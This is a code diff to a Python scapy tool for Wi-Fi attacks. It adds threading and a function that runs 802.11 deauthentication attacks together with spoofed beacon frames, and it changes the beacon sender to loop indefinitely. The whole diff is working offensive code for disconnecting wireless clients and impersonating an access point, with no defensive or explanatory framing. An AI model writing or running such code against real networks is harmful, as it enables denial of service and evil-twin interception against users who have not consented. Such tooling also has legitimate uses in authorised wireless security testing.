@@ -1,3 +1,4 @@
+import threading
 from scapy.all import sendp, Dot11, RadioTap, Dot11Deauth, Dot11Beacon, Dot11Elt
 
 
@@ -16,4 +17,16 @@ def beacon(iface: str, BSSID: str, SSID: str, timeout: int = 20):
         Dot11Elt(ID='SSID', info=SSID, len=len(SSID))
     print(f'SENDING BEACON for {BSSID}')
 
-    sendp(packet, iface=iface, inter=0.100, timeout=timeout)
+    sendp(packet, iface=iface, loop=1, inter=0.1)
+
+
+def deauth_with_beacon(iface: str, BSSID: str, client: str, SSID: str, reason: int = 7, timeout: int = 20):
+
+    deauth_thread = threading.Thread(target=deauth, args=(iface, BSSID, client, reason))
+    beacon_thread = threading.Thread(target=beacon, args=(iface, BSSID, SSID, timeout))
+
+    deauth_thread.start()
+    beacon_thread.start()
+
+    deauth_thread.join()
+    beacon_thread.join()
